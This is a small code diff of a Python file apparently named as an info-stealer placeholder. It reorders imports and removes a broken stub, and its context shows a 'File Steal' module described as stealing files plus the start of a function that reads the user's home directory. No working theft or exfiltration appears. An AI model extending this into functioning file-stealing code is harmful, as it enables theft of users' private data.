@@ -1,5 +1,7 @@
 # modules/training/info_stealer_placeholder.py
-
+import os
+import shutil
+import platform
 from dataclasses import dataclass
 from typing import Callable
 
@@ -32,11 +34,6 @@ def register_module(name: str, description: str):
     "File Steal",
     "This module is made for stealing files from URL'S",
 )
-def my_module():
-    # modules/files_collection.py
-import os
-import shutil
-import platform
 
 def collect_files():
     home_path = os.path.expanduser("~")
